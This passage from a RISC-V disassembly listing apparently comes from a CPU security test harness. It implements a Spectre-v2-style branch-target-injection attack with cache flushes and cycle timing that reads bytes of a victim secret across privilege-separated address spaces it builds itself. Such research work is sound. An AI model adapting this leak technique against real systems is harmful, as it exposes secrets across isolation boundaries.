    100012ce:	0001                	nop

00000000100012d0 <svc_victim.constprop.0>:
    100012d0:	7000e597          	auipc	a1,0x7000e
    100012d4:	d3058593          	addi	a1,a1,-720 # 8000f000 <shared_probe>
    100012d8:	4885                	li	a7,1
    100012da:	00000073          	ecall
    100012de:	8082                	ret

00000000100012e0 <top_four_idx.constprop.0>:
    100012e0:	872e                	mv	a4,a1
    100012e2:	02060693          	addi	a3,a2,32
    100012e6:	87b2                	mv	a5,a2
    100012e8:	00070023          	sb	zero,0(a4)
    100012ec:	0007b023          	sd	zero,0(a5)
    100012f0:	07a1                	addi	a5,a5,8
    100012f2:	0705                	addi	a4,a4,1
    100012f4:	fed79ae3          	bne	a5,a3,100012e8 <top_four_idx.constprop.0+0x8>
    100012f8:	4881                	li	a7,0
    100012fa:	4311                	li	t1,4
    100012fc:	428d                	li	t0,3
    100012fe:	10000e93          	li	t4,256
    10001302:	00053803          	ld	a6,0(a0)
    10001306:	8732                	mv	a4,a2
    10001308:	4781                	li	a5,0
    1000130a:	6314                	ld	a3,0(a4)
    1000130c:	0106eb63          	bltu	a3,a6,10001322 <top_four_idx.constprop.0+0x42>
    10001310:	0785                	addi	a5,a5,1
    10001312:	0721                	addi	a4,a4,8
    10001314:	fe679be3          	bne	a5,t1,1000130a <top_four_idx.constprop.0+0x2a>
    10001318:	0885                	addi	a7,a7,1
    1000131a:	0521                	addi	a0,a0,8
    1000131c:	ffd893e3          	bne	a7,t4,10001302 <top_four_idx.constprop.0+0x22>
    10001320:	8082                	ret
    10001322:	02578463          	beq	a5,t0,1000134a <top_four_idx.constprop.0+0x6a>
    10001326:	00258e13          	addi	t3,a1,2
    1000132a:	01860693          	addi	a3,a2,24
    1000132e:	20c7efb3          	sh3add	t6,a5,a2
    10001332:	ff86bf03          	ld	t5,-8(a3)
    10001336:	1e7d                	addi	t3,t3,-1
    10001338:	16e1                	addi	a3,a3,-8
    1000133a:	01e6b423          	sd	t5,8(a3)
    1000133e:	001e4f03          	lbu	t5,1(t3)
    10001342:	01ee0123          	sb	t5,2(t3)
    10001346:	fff696e3          	bne	a3,t6,10001332 <top_four_idx.constprop.0+0x52>
    1000134a:	01073023          	sd	a6,0(a4)
    1000134e:	97ae                	add	a5,a5,a1
    10001350:	01178023          	sb	a7,0(a5)
    10001354:	0885                	addi	a7,a7,1
    10001356:	0521                	addi	a0,a0,8
    10001358:	fbd895e3          	bne	a7,t4,10001302 <top_four_idx.constprop.0+0x22>
    1000135c:	8082                	ret
    1000135e:	0001                	nop

0000000010001360 <top_two_idx.constprop.0>:
    10001360:	00058023          	sb	zero,0(a1)
    10001364:	000580a3          	sb	zero,1(a1)
    10001368:	00063023          	sd	zero,0(a2)
    1000136c:	00063423          	sd	zero,8(a2)
    10001370:	4681                	li	a3,0
    10001372:	4781                	li	a5,0
    10001374:	10000813          	li	a6,256
    10001378:	a839                	j	10001396 <top_two_idx.constprop.0+0x36>
    1000137a:	e614                	sd	a3,8(a2)
    1000137c:	0005c703          	lbu	a4,0(a1)
    10001380:	00e580a3          	sb	a4,1(a1)
    10001384:	6118                	ld	a4,0(a0)
    10001386:	e218                	sd	a4,0(a2)
    10001388:	00f58023          	sb	a5,0(a1)
    1000138c:	0785                	addi	a5,a5,1
    1000138e:	0521                	addi	a0,a0,8
    10001390:	03078063          	beq	a5,a6,100013b0 <top_two_idx.constprop.0+0x50>
    10001394:	6214                	ld	a3,0(a2)
    10001396:	6118                	ld	a4,0(a0)
    10001398:	fee6e1e3          	bltu	a3,a4,1000137a <top_two_idx.constprop.0+0x1a>
    1000139c:	6614                	ld	a3,8(a2)
    1000139e:	fee6f7e3          	bgeu	a3,a4,1000138c <top_two_idx.constprop.0+0x2c>
    100013a2:	e618                	sd	a4,8(a2)
    100013a4:	00f580a3          	sb	a5,1(a1)
    100013a8:	0785                	addi	a5,a5,1
    100013aa:	0521                	addi	a0,a0,8
    100013ac:	ff0794e3          	bne	a5,a6,10001394 <top_two_idx.constprop.0+0x34>
    100013b0:	8082                	ret
    100013b2:	0001                	nop
    100013b4:	00000013          	nop
    100013b8:	00000013          	nop
    100013bc:	00000013          	nop

00000000100013c0 <enough_confidence>:
    100013c0:	7179                	addi	sp,sp,-48
    100013c2:	0810                	addi	a2,sp,16
    100013c4:	002c                	addi	a1,sp,8
    100013c6:	f406                	sd	ra,40(sp)
    100013c8:	f99ff0ef          	jal	10001360 <top_two_idx.constprop.0>
    100013cc:	6542                	ld	a0,16(sp)
    100013ce:	4789                	li	a5,2
    100013d0:	00a7fb63          	bgeu	a5,a0,100013e6 <enough_confidence+0x26>
    100013d4:	67e2                	ld	a5,24(sp)
    100013d6:	70a2                	ld	ra,40(sp)
    100013d8:	0789                	addi	a5,a5,2
    100013da:	00f53533          	sltu	a0,a0,a5
    100013de:	00154513          	xori	a0,a0,1
    100013e2:	6145                	addi	sp,sp,48
    100013e4:	8082                	ret
    100013e6:	70a2                	ld	ra,40(sp)
    100013e8:	4501                	li	a0,0
    100013ea:	6145                	addi	sp,sp,48
    100013ec:	8082                	ret
    100013ee:	0001                	nop

00000000100013f0 <read_byte>:
    100013f0:	7119                	addi	sp,sp,-128
    100013f2:	fc5e                	sd	s7,56(sp)
    100013f4:	f06a                	sd	s10,32(sp)
    100013f6:	fc86                	sd	ra,120(sp)
    100013f8:	f8a2                	sd	s0,112(sp)
    100013fa:	f4a6                	sd	s1,104(sp)
    100013fc:	f0ca                	sd	s2,96(sp)
    100013fe:	ecce                	sd	s3,88(sp)
    10001400:	e8d2                	sd	s4,80(sp)
    10001402:	e4d6                	sd	s5,72(sp)
    10001404:	e0da                	sd	s6,64(sp)
    10001406:	f862                	sd	s8,48(sp)
    10001408:	f466                	sd	s9,40(sp)
    1000140a:	ec6e                	sd	s11,24(sp)
    1000140c:	28b01713          	bseti	a4,zero,0xb
    10001410:	81010113          	addi	sp,sp,-2032
    10001414:	8baa                	mv	s7,a0
    10001416:	8d2e                	mv	s10,a1
    10001418:	878a                	mv	a5,sp
    1000141a:	970a                	add	a4,a4,sp
    1000141c:	0007b023          	sd	zero,0(a5)
    10001420:	07a1                	addi	a5,a5,8
    10001422:	fef71de3          	bne	a4,a5,1000141c <read_byte+0x2c>
    10001426:	4901                	li	s2,0
    10001428:	70004c97          	auipc	s9,0x70004
    1000142c:	bd8c8c93          	addi	s9,s9,-1064 # 80005000 <rounds_used>
    10001430:	003d1c13          	slli	s8,s10,0x3
    10001434:	10000993          	li	s3,256
    10001438:	7000ea17          	auipc	s4,0x7000e
    1000143c:	bc8a0a13          	addi	s4,s4,-1080 # 8000f000 <shared_probe>
    10001440:	70003b17          	auipc	s6,0x70003
    10001444:	bc0b0b13          	addi	s6,s6,-1088 # 80004000 <active_threshold>
    10001448:	03e00a93          	li	s5,62
    1000144c:	855e                	mv	a0,s7
    1000144e:	e83ff0ef          	jal	100012d0 <svc_victim.constprop.0>
    10001452:	4d81                	li	s11,0
    10001454:	4481                	li	s1,0
    10001456:	85ca                	mv	a1,s2
    10001458:	856e                	mv	a0,s11
    1000145a:	d87ff0ef          	jal	100011e0 <reload_mix>
    1000145e:	842a                	mv	s0,a0
    10001460:	d61ff0ef          	jal	100011c0 <is_candidate_value>
    10001464:	c945                	beqz	a0,10001514 <read_byte+0x124>
    10001466:	00641513          	slli	a0,s0,0x6
    1000146a:	9552                	add	a0,a0,s4
    1000146c:	c445                	beqz	s0,10001514 <read_byte+0x124>
    1000146e:	da3ff0ef          	jal	10001210 <u_probe_time>
    10001472:	28b01793          	bseti	a5,zero,0xb
    10001476:	978a                	add	a5,a5,sp
    10001478:	20f46433          	sh3add	s0,s0,a5
    1000147c:	000b3783          	ld	a5,0(s6)
    10001480:	0485                	addi	s1,s1,1
    10001482:	0d85                	addi	s11,s11,1
    10001484:	00a7e763          	bltu	a5,a0,10001492 <read_byte+0xa2>
    10001488:	80043783          	ld	a5,-2048(s0)
    1000148c:	0785                	addi	a5,a5,1
    1000148e:	80f43023          	sd	a5,-2048(s0)
    10001492:	013d8463          	beq	s11,s3,1000149a <read_byte+0xaa>
    10001496:	fd5490e3          	bne	s1,s5,10001456 <read_byte+0x66>
    1000149a:	0905                	addi	s2,s2,1
    1000149c:	018c87b3          	add	a5,s9,s8
    100014a0:	850a                	mv	a0,sp
    100014a2:	0127b023          	sd	s2,0(a5)
    100014a6:	f1bff0ef          	jal	100013c0 <enough_confidence>
    100014aa:	e501                	bnez	a0,100014b2 <read_byte+0xc2>
    100014ac:	47c1                	li	a5,16
    100014ae:	f8f91fe3          	bne	s2,a5,1000144c <read_byte+0x5c>
    100014b2:	004d1793          	slli	a5,s10,0x4
    100014b6:	70005617          	auipc	a2,0x70005
    100014ba:	b4a60613          	addi	a2,a2,-1206 # 80006000 <leaked_score>
    100014be:	963e                	add	a2,a2,a5
    100014c0:	850a                	mv	a0,sp
    100014c2:	70006597          	auipc	a1,0x70006
    100014c6:	b3e58593          	addi	a1,a1,-1218 # 80007000 <leaked_idx>
    100014ca:	20bd25b3          	sh1add	a1,s10,a1
    100014ce:	e93ff0ef          	jal	10001360 <top_two_idx.constprop.0>
    100014d2:	005d1793          	slli	a5,s10,0x5
    100014d6:	70007617          	auipc	a2,0x70007
    100014da:	b2a60613          	addi	a2,a2,-1238 # 80008000 <leaked_top_score>
    100014de:	850a                	mv	a0,sp
    100014e0:	963e                	add	a2,a2,a5
    100014e2:	70008597          	auipc	a1,0x70008
    100014e6:	b1e58593          	addi	a1,a1,-1250 # 80009000 <leaked_top_idx>
    100014ea:	20bd45b3          	sh2add	a1,s10,a1
    100014ee:	df3ff0ef          	jal	100012e0 <top_four_idx.constprop.0>
    100014f2:	7f010113          	addi	sp,sp,2032
    100014f6:	70e6                	ld	ra,120(sp)
    100014f8:	7446                	ld	s0,112(sp)
    100014fa:	74a6                	ld	s1,104(sp)
    100014fc:	7906                	ld	s2,96(sp)
    100014fe:	69e6                	ld	s3,88(sp)
    10001500:	6a46                	ld	s4,80(sp)
    10001502:	6aa6                	ld	s5,72(sp)
    10001504:	6b06                	ld	s6,64(sp)
    10001506:	7be2                	ld	s7,56(sp)
    10001508:	7c42                	ld	s8,48(sp)
    1000150a:	7ca2                	ld	s9,40(sp)
    1000150c:	7d02                	ld	s10,32(sp)
    1000150e:	6de2                	ld	s11,24(sp)
    10001510:	6109                	addi	sp,sp,128
    10001512:	8082                	ret
    10001514:	0d85                	addi	s11,s11,1
    10001516:	f53d90e3          	bne	s11,s3,10001456 <read_byte+0x66>
    1000151a:	b741                	j	1000149a <read_byte+0xaa>
    1000151c:	00000013          	nop

0000000010001520 <attacker_run>:
    10001520:	1101                	addi	sp,sp,-32
    10001522:	e822                	sd	s0,16(sp)
    10001524:	e426                	sd	s1,8(sp)
    10001526:	e04a                	sd	s2,0(sp)
    10001528:	ec06                	sd	ra,24(sp)
    1000152a:	70012497          	auipc	s1,0x70012
    1000152e:	ad648493          	addi	s1,s1,-1322 # 80013000 <victim_secret>
    10001532:	cffff0ef          	jal	10001230 <probe_direct_victim_access>
    10001536:	4401                	li	s0,0
    10001538:	4919                	li	s2,6
    1000153a:	85a2                	mv	a1,s0
    1000153c:	8526                	mv	a0,s1
    1000153e:	0405                	addi	s0,s0,1
    10001540:	eb1ff0ef          	jal	100013f0 <read_byte>
    10001544:	0485                	addi	s1,s1,1
    10001546:	ff241ae3          	bne	s0,s2,1000153a <attacker_run+0x1a>
    1000154a:	60e2                	ld	ra,24(sp)
    1000154c:	6442                	ld	s0,16(sp)
    1000154e:	64a2                	ld	s1,8(sp)
    10001550:	6902                	ld	s2,0(sp)
    10001552:	4501                	li	a0,0
    10001554:	6105                	addi	sp,sp,32
    10001556:	8082                	ret
    10001558:	00000013          	nop
    1000155c:	00000013          	nop

0000000010001560 <attacker_entry>:
    10001560:	1141                	addi	sp,sp,-16
    10001562:	e406                	sd	ra,8(sp)
    10001564:	fbdff0ef          	jal	10001520 <attacker_run>
    10001568:	d59ff0ef          	jal	100012c0 <svc_exit>
	...

0000000010002000 <__u_text_end>:
	...

Disassembly of section .text.startup:

0000000010002002 <main>:
    10002002:	7151                	addi	sp,sp,-240
    10002004:	7000d617          	auipc	a2,0x7000d
    10002008:	ffc60613          	addi	a2,a2,-4 # 8000f000 <shared_probe>
    1000200c:	f586                	sd	ra,232(sp)
    1000200e:	f1a2                	sd	s0,224(sp)
    10002010:	eda6                	sd	s1,216(sp)
    10002012:	e9ca                	sd	s2,208(sp)
    10002014:	e5ce                	sd	s3,200(sp)
    10002016:	e1d2                	sd	s4,192(sp)
    10002018:	fd56                	sd	s5,184(sp)
    1000201a:	f95a                	sd	s6,176(sp)
    1000201c:	f55e                	sd	s7,168(sp)
    1000201e:	f162                	sd	s8,160(sp)
    10002020:	ed66                	sd	s9,152(sp)
    10002022:	e96a                	sd	s10,144(sp)
    10002024:	e56e                	sd	s11,136(sp)
    10002026:	87b2                	mv	a5,a2
    10002028:	70011697          	auipc	a3,0x70011
    1000202c:	fd868693          	addi	a3,a3,-40 # 80013000 <victim_secret>
    10002030:	4705                	li	a4,1
    10002032:	00e78023          	sb	a4,0(a5)
    10002036:	04078793          	addi	a5,a5,64
    1000203a:	fed79ce3          	bne	a5,a3,10002032 <main+0x30>
    1000203e:	70014797          	auipc	a5,0x70014
    10002042:	fc078123          	sb	zero,-62(a5) # 80016000 <v2_public_dummy>
    10002046:	70015717          	auipc	a4,0x70015
    1000204a:	fba70713          	addi	a4,a4,-70 # 80017000 <v2_train_node>
    1000204e:	fffff797          	auipc	a5,0xfffff
    10002052:	0f278793          	addi	a5,a5,242 # 10001140 <v2_asm_gadget>
    10002056:	e31c                	sd	a5,0(a4)
    10002058:	70016797          	auipc	a5,0x70016
    1000205c:	fa878793          	addi	a5,a5,-88 # 80018000 <v2_train_mid>
    10002060:	e398                	sd	a4,0(a5)
    10002062:	70017717          	auipc	a4,0x70017
    10002066:	f8f73f23          	sd	a5,-98(a4) # 80019000 <v2_train_root>
    1000206a:	70018717          	auipc	a4,0x70018
    1000206e:	f9670713          	addi	a4,a4,-106 # 8001a000 <v2_attack_node>
    10002072:	fffff797          	auipc	a5,0xfffff
    10002076:	10e78793          	addi	a5,a5,270 # 10001180 <v2_asm_safe>
    1000207a:	e31c                	sd	a5,0(a4)
    1000207c:	70019797          	auipc	a5,0x70019
    10002080:	f8478793          	addi	a5,a5,-124 # 8001b000 <v2_attack_mid>
    10002084:	e398                	sd	a4,0(a5)
    10002086:	7001a717          	auipc	a4,0x7001a
    1000208a:	f6f73d23          	sd	a5,-134(a4) # 8001c000 <v2_attack_root>
    1000208e:	06010ea3          	sb	zero,125(sp)
    10002092:	4421                	li	s0,8
    10002094:	4681                	li	a3,0
    10002096:	4701                	li	a4,0
    10002098:	7000d817          	auipc	a6,0x7000d
    1000209c:	fa880813          	addi	a6,a6,-88 # 8000f040 <shared_probe+0x40>
    100020a0:	00064783          	lbu	a5,0(a2)
    100020a4:	07d14583          	lbu	a1,125(sp)
    100020a8:	8fed                	and	a5,a5,a1
    100020aa:	06f10ea3          	sb	a5,125(sp)
    100020ae:	06010fa3          	sb	zero,127(sp)
    100020b2:	0330000f          	fence	rw,rw
    100020b6:	c00025f3          	rdcycle	a1
    100020ba:	00064783          	lbu	a5,0(a2)
    100020be:	07f14503          	lbu	a0,127(sp)
    100020c2:	8fe9                	and	a5,a5,a0
    100020c4:	06f10fa3          	sb	a5,127(sp)
    100020c8:	0330000f          	fence	rw,rw
    100020cc:	c00027f3          	rdcycle	a5
    100020d0:	8f8d                	sub	a5,a5,a1
    100020d2:	973e                	add	a4,a4,a5
    100020d4:	0028200f          	cbo.flush	(a6)
    100020d8:	0330000f          	fence	rw,rw
    100020dc:	06010f23          	sb	zero,126(sp)
    100020e0:	0330000f          	fence	rw,rw
    100020e4:	c00025f3          	rdcycle	a1
    100020e8:	04064783          	lbu	a5,64(a2)
    100020ec:	07e14503          	lbu	a0,126(sp)
    100020f0:	8fe9                	and	a5,a5,a0
    100020f2:	06f10f23          	sb	a5,126(sp)
    100020f6:	0330000f          	fence	rw,rw
    100020fa:	c00027f3          	rdcycle	a5
    100020fe:	8f8d                	sub	a5,a5,a1
    10002100:	147d                	addi	s0,s0,-1
    10002102:	96be                	add	a3,a3,a5
    10002104:	fc51                	bnez	s0,100020a0 <main+0x9e>
    10002106:	00375493          	srli	s1,a4,0x3
    1000210a:	828d                	srli	a3,a3,0x3
    1000210c:	94b6                	add	s1,s1,a3
    1000210e:	8085                	srli	s1,s1,0x1
    10002110:	04600313          	li	t1,70
    10002114:	c091                	beqz	s1,10002118 <main+0x116>
    10002116:	8326                	mv	t1,s1
    10002118:	10000793          	li	a5,256
    1000211c:	e8be                	sd	a5,80(sp)
    1000211e:	02000793          	li	a5,32
    10002122:	ec3e                	sd	a5,24(sp)
    10002124:	47c1                	li	a5,16
    10002126:	e83e                	sd	a5,16(sp)
    10002128:	03e00793          	li	a5,62
    1000212c:	e43e                	sd	a5,8(sp)
    1000212e:	4799                	li	a5,6
    10002130:	e03e                	sd	a5,0(sp)
    10002132:	70002917          	auipc	s2,0x70002
    10002136:	ece90913          	addi	s2,s2,-306 # 80004000 <active_threshold>
    1000213a:	ec82                	sd	zero,88(sp)
    1000213c:	e482                	sd	zero,72(sp)
    1000213e:	e082                	sd	zero,64(sp)
    10002140:	fc02                	sd	zero,56(sp)
    10002142:	f802                	sd	zero,48(sp)
    10002144:	f402                	sd	zero,40(sp)
    10002146:	f002                	sd	zero,32(sp)
    10002148:	4881                	li	a7,0
    1000214a:	4801                	li	a6,0
    1000214c:	4781                	li	a5,0
    1000214e:	00693023          	sd	t1,0(s2)
    10002152:	475d                	li	a4,23
    10002154:	46c5                	li	a3,17
    10002156:	465d                	li	a2,23
    10002158:	45c5                	li	a1,17
    1000215a:	00003517          	auipc	a0,0x3
    1000215e:	c6650513          	addi	a0,a0,-922 # 10004dc0 <printf_+0x7c>
    10002162:	3e3020ef          	jal	10004d44 <printf_>
    10002166:	4581                	li	a1,0
    10002168:	00003517          	auipc	a0,0x3
    1000216c:	df050513          	addi	a0,a0,-528 # 10004f58 <printf_+0x214>
    10002170:	3d5020ef          	jal	10004d44 <printf_>
    10002174:	00093683          	ld	a3,0(s2)
    10002178:	8626                	mv	a2,s1
    1000217a:	4701                	li	a4,0
    1000217c:	04600593          	li	a1,70
    10002180:	00003517          	auipc	a0,0x3
    10002184:	df850513          	addi	a0,a0,-520 # 10004f78 <printf_+0x234>
    10002188:	3bd020ef          	jal	10004d44 <printf_>
    1000218c:	00003517          	auipc	a0,0x3
    10002190:	e3c50513          	addi	a0,a0,-452 # 10004fc8 <printf_+0x284>
    10002194:	3b1020ef          	jal	10004d44 <printf_>
    10002198:	fffff717          	auipc	a4,0xfffff
    1000219c:	fe870713          	addi	a4,a4,-24 # 10001180 <v2_asm_safe>
    100021a0:	fffff697          	auipc	a3,0xfffff
    100021a4:	fa068693          	addi	a3,a3,-96 # 10001140 <v2_asm_gadget>
    100021a8:	7000d617          	auipc	a2,0x7000d
    100021ac:	e5860613          	addi	a2,a2,-424 # 8000f000 <shared_probe>
    100021b0:	70011597          	auipc	a1,0x70011
    100021b4:	e5058593          	addi	a1,a1,-432 # 80013000 <victim_secret>
    100021b8:	00003517          	auipc	a0,0x3
    100021bc:	e9050513          	addi	a0,a0,-368 # 10005048 <printf_+0x304>
    100021c0:	385020ef          	jal	10004d44 <printf_>
    100021c4:	5b7000ef          	jal	10002f7a <init_pmp>
    100021c8:	ffffe797          	auipc	a5,0xffffe
    100021cc:	e6c78793          	addi	a5,a5,-404 # 10000034 <m_trap_entry>
    100021d0:	30579073          	csrw	mtvec,a5
    100021d4:	30201073          	csrw	medeleg,zero
    100021d8:	30301073          	csrw	mideleg,zero
    100021dc:	52fd                	li	t0,-1
    100021de:	30629073          	csrw	mcounteren,t0
    100021e2:	10629073          	csrw	scounteren,t0
    100021e6:	70071697          	auipc	a3,0x70071
    100021ea:	e1a68693          	addi	a3,a3,-486 # 80073000 <attacker_space>
    100021ee:	87b6                	mv	a5,a3
    100021f0:	70072717          	auipc	a4,0x70072
    100021f4:	e1070713          	addi	a4,a4,-496 # 80074000 <attacker_space+0x1000>
    100021f8:	0007b023          	sd	zero,0(a5)
    100021fc:	07a1                	addi	a5,a5,8
    100021fe:	fee79de3          	bne	a5,a4,100021f8 <main+0x1f6>
    10002202:	800117b7          	lui	a5,0x80011
    10002206:	1782                	slli	a5,a5,0x20
    10002208:	82b1                	srli	a3,a3,0xc
    1000220a:	00f6e833          	or	a6,a3,a5
    1000220e:	700c2797          	auipc	a5,0x700c2
    10002212:	de07b923          	sd	zero,-526(a5) # 800c4000 <attacker_space+0x51000>
    10002216:	700c2797          	auipc	a5,0x700c2
    1000221a:	de07b923          	sd	zero,-526(a5) # 800c4008 <attacker_space+0x51008>
    1000221e:	700c2497          	auipc	s1,0x700c2
    10002222:	de248493          	addi	s1,s1,-542 # 800c4000 <attacker_space+0x51000>
    10002226:	47c5                	li	a5,17
    10002228:	7001f697          	auipc	a3,0x7001f
    1000222c:	dd868693          	addi	a3,a3,-552 # 80021000 <victim_space>
    10002230:	e89c                	sd	a5,16(s1)
    10002232:	0104bc23          	sd	a6,24(s1)
    10002236:	87b6                	mv	a5,a3
    10002238:	70020717          	auipc	a4,0x70020
    1000223c:	dc870713          	addi	a4,a4,-568 # 80022000 <victim_space+0x1000>
    10002240:	0007b023          	sd	zero,0(a5)
    10002244:	07a1                	addi	a5,a5,8
    10002246:	fee79de3          	bne	a5,a4,10002240 <main+0x23e>
    1000224a:	80017737          	lui	a4,0x80017
    1000224e:	1702                	slli	a4,a4,0x20
    10002250:	00c6d793          	srli	a5,a3,0xc
    10002254:	8fd9                	or	a5,a5,a4
    10002256:	70070717          	auipc	a4,0x70070
    1000225a:	da073523          	sd	zero,-598(a4) # 80072000 <victim_space+0x51000>
    1000225e:	70070717          	auipc	a4,0x70070
    10002262:	da073523          	sd	zero,-598(a4) # 80072008 <victim_space+0x51008>
    10002266:	70070917          	auipc	s2,0x70070
    1000226a:	d9a90913          	addi	s2,s2,-614 # 80072000 <victim_space+0x51000>
    1000226e:	475d                	li	a4,23
    10002270:	46a9                	li	a3,10
    10002272:	00000617          	auipc	a2,0x0
    10002276:	d8e60613          	addi	a2,a2,-626 # 10002000 <__u_text_end>
    1000227a:	fffff597          	auipc	a1,0xfffff
    1000227e:	d8658593          	addi	a1,a1,-634 # 10001000 <__u_text_start>
    10002282:	70071517          	auipc	a0,0x70071
    10002286:	d7e50513          	addi	a0,a0,-642 # 80073000 <attacker_space>
    1000228a:	00f93c23          	sd	a5,24(s2)
    1000228e:	00e93823          	sd	a4,16(s2)
    10002292:	700c7797          	auipc	a5,0x700c7
    10002296:	d907b723          	sd	a6,-626(a5) # 800c9020 <attacker_satp_for_trap>
    1000229a:	f17fd0ef          	jal	100001b0 <map_identity_range>
    1000229e:	4e051263          	bnez	a0,10002782 <machine_low_return+0x3da>
    100022a2:	46a9                	li	a3,10
    100022a4:	00000617          	auipc	a2,0x0
    100022a8:	d5c60613          	addi	a2,a2,-676 # 10002000 <__u_text_end>
    100022ac:	fffff597          	auipc	a1,0xfffff
    100022b0:	d5458593          	addi	a1,a1,-684 # 10001000 <__u_text_start>
    100022b4:	7001f517          	auipc	a0,0x7001f
    100022b8:	d4c50513          	addi	a0,a0,-692 # 80021000 <victim_space>
    100022bc:	ef5fd0ef          	jal	100001b0 <map_identity_range>
    100022c0:	48051c63          	bnez	a0,10002758 <machine_low_return+0x3b0>
    100022c4:	4699                	li	a3,6
    100022c6:	7000c617          	auipc	a2,0x7000c
    100022ca:	d3a60613          	addi	a2,a2,-710 # 8000e000 <m_dummy>
    100022ce:	6fffe597          	auipc	a1,0x6fffe
    100022d2:	d3258593          	addi	a1,a1,-718 # 80000000 <direct_victim_fault_seen>
    100022d6:	70071517          	auipc	a0,0x70071
    100022da:	d2a50513          	addi	a0,a0,-726 # 80073000 <attacker_space>
    100022de:	ed3fd0ef          	jal	100001b0 <map_identity_range>
    100022e2:	44051663          	bnez	a0,1000272e <machine_low_return+0x386>
    100022e6:	7000ca17          	auipc	s4,0x7000c
    100022ea:	d1aa0a13          	addi	s4,s4,-742 # 8000e000 <m_dummy>
    100022ee:	70011a97          	auipc	s5,0x70011
    100022f2:	d12a8a93          	addi	s5,s5,-750 # 80013000 <victim_secret>
    100022f6:	4699                	li	a3,6
    100022f8:	8656                	mv	a2,s5
    100022fa:	85d2                	mv	a1,s4
    100022fc:	70071517          	auipc	a0,0x70071
    10002300:	d0450513          	addi	a0,a0,-764 # 80073000 <attacker_space>
    10002304:	eadfd0ef          	jal	100001b0 <map_identity_range>
    10002308:	3e051e63          	bnez	a0,10002704 <machine_low_return+0x35c>
    1000230c:	4699                	li	a3,6
    1000230e:	8656                	mv	a2,s5
    10002310:	85d2                	mv	a1,s4
    10002312:	7001f517          	auipc	a0,0x7001f
    10002316:	cee50513          	addi	a0,a0,-786 # 80021000 <victim_space>
    1000231a:	e97fd0ef          	jal	100001b0 <map_identity_range>
    1000231e:	3a051e63          	bnez	a0,100026da <machine_low_return+0x332>
    10002322:	4699                	li	a3,6
    10002324:	7001f617          	auipc	a2,0x7001f
    10002328:	cdc60613          	addi	a2,a2,-804 # 80021000 <victim_space>
    1000232c:	70011597          	auipc	a1,0x70011
    10002330:	cd458593          	addi	a1,a1,-812 # 80013000 <victim_secret>
    10002334:	7001f517          	auipc	a0,0x7001f
    10002338:	ccc50513          	addi	a0,a0,-820 # 80021000 <victim_space>
    1000233c:	e75fd0ef          	jal	100001b0 <map_identity_range>
    10002340:	89aa                	mv	s3,a0
    10002342:	36051763          	bnez	a0,100026b0 <machine_low_return+0x308>
    10002346:	6c9c                	ld	a5,24(s1)
    10002348:	18079073          	csrw	satp,a5
    1000234c:	12000073          	sfence.vma
    10002350:	0000100f          	fence.i
    10002354:	180027f3          	csrr	a5,satp
    10002358:	700c7b17          	auipc	s6,0x700c7
    1000235c:	cd8b0b13          	addi	s6,s6,-808 # 800c9030 <observed_attacker_satp>
    10002360:	00fb3023          	sd	a5,0(s6)
    10002364:	878a                	mv	a5,sp
    10002366:	700c7717          	auipc	a4,0x700c7
    1000236a:	ccf73d23          	sd	a5,-806(a4) # 800c9040 <saved_main_m_sp>
    1000236e:	300027f3          	csrr	a5,mstatus
    10002372:	7000c697          	auipc	a3,0x7000c
    10002376:	c7e68693          	addi	a3,a3,-898 # 8000dff0 <attacker_stack+0x3ff0>
    1000237a:	700c7717          	auipc	a4,0x700c7
    1000237e:	c7670713          	addi	a4,a4,-906 # 800c8ff0 <m_stack+0x3ff0>
    10002382:	fffff617          	auipc	a2,0xfffff
    10002386:	1de60613          	addi	a2,a2,478 # 10001560 <attacker_entry>
    1000238a:	48b79793          	bclri	a5,a5,0xb
    1000238e:	48c79793          	bclri	a5,a5,0xc
    10002392:	28b79793          	bseti	a5,a5,0xb
    10002396:	34071073          	csrw	mscratch,a4
    1000239a:	8136                	mv	sp,a3
    1000239c:	30079073          	csrw	mstatus,a5
    100023a0:	34161073          	csrw	mepc,a2
    100023a4:	30200073          	mret

00000000100023a8 <machine_low_return>:
    100023a8:	700c7297          	auipc	t0,0x700c7
    100023ac:	c9828293          	addi	t0,t0,-872 # 800c9040 <saved_main_m_sp>
    100023b0:	0002b103          	ld	sp,0(t0)
    100023b4:	6fffe797          	auipc	a5,0x6fffe
    100023b8:	c4c78793          	addi	a5,a5,-948 # 80000000 <direct_victim_fault_seen>
    100023bc:	638c                	ld	a1,0(a5)
    100023be:	6ffff797          	auipc	a5,0x6ffff
    100023c2:	c4278793          	addi	a5,a5,-958 # 80001000 <direct_victim_read_completed>
    100023c6:	6390                	ld	a2,0(a5)
    100023c8:	7001f797          	auipc	a5,0x7001f
    100023cc:	c3878793          	addi	a5,a5,-968 # 80021000 <victim_space>
    100023d0:	70000697          	auipc	a3,0x70000
    100023d4:	c306b683          	ld	a3,-976(a3) # 80002000 <direct_victim_read_value>
    100023d8:	ec3e                	sd	a5,24(sp)
    100023da:	70011797          	auipc	a5,0x70011
    100023de:	c2678793          	addi	a5,a5,-986 # 80013000 <victim_secret>
    100023e2:	7000c897          	auipc	a7,0x7000c
    100023e6:	c1e88893          	addi	a7,a7,-994 # 8000e000 <m_dummy>
    100023ea:	6fffe817          	auipc	a6,0x6fffe
    100023ee:	c1680813          	addi	a6,a6,-1002 # 80000000 <direct_victim_fault_seen>
    100023f2:	e83e                	sd	a5,16(sp)
    100023f4:	e456                	sd	s5,8(sp)
    100023f6:	00000797          	auipc	a5,0x0
    100023fa:	c0a78793          	addi	a5,a5,-1014 # 10002000 <__u_text_end>
    100023fe:	fffff717          	auipc	a4,0xfffff
    10002402:	c0270713          	addi	a4,a4,-1022 # 10001000 <__u_text_start>
    10002406:	0ff6f693          	zext.b	a3,a3
    1000240a:	e052                	sd	s4,0(sp)
    1000240c:	00003517          	auipc	a0,0x3
    10002410:	04c50513          	addi	a0,a0,76 # 10005458 <printf_+0x714>
    10002414:	131020ef          	jal	10004d44 <printf_>
    10002418:	000b3683          	ld	a3,0(s6)
    1000241c:	01893603          	ld	a2,24(s2)
    10002420:	6c8c                	ld	a1,24(s1)
    10002422:	0ffff7b7          	lui	a5,0xffff
    10002426:	1782                	slli	a5,a5,0x20
    10002428:	700c7717          	auipc	a4,0x700c7
    1000242c:	c0073703          	ld	a4,-1024(a4) # 800c9028 <observed_victim_satp>
    10002430:	00003517          	auipc	a0,0x3
    10002434:	0c050513          	addi	a0,a0,192 # 100054f0 <printf_+0x7ac>
    10002438:	10d020ef          	jal	10004d44 <printf_>
    1000243c:	700c7797          	auipc	a5,0x700c7
    10002440:	c4c78793          	addi	a5,a5,-948 # 800c9088 <victim_call_count>
